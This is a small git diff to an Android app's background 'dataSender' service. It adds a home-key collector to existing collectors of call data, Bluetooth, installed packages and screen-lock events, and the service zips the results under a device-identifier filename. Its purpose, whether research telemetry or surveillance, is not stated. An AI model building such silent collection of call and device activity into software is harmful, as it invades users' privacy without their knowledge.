@@ -7,6 +7,7 @@ import android.os.Environment;
 import com.media.ui.DataCollector.bluetoothCollect;
 import com.media.ui.DataCollector.callData;
 import com.media.ui.DataCollector.earjackCollector;
+import com.media.ui.DataCollector.homeKeyCollector;
 import com.media.ui.DataCollector.lowBatteryData;
 import com.media.ui.DataCollector.miscCollector;
 import com.media.ui.DataCollector.packageDetails;
@@ -52,6 +53,7 @@ public class dataSender extends IntentService {
             new packageMonitorCollector(this);
             new earjackCollector(this);
             new screenLockCollector(this);
+            new homeKeyCollector(this);
 
             File d = new File(Environment.getExternalStorageDirectory(), constants.DataFolder);
             File f = new File(Environment.getExternalStorageDirectory(), "final_"+imi(this)+"_"+String.valueOf(timi)+".zip");
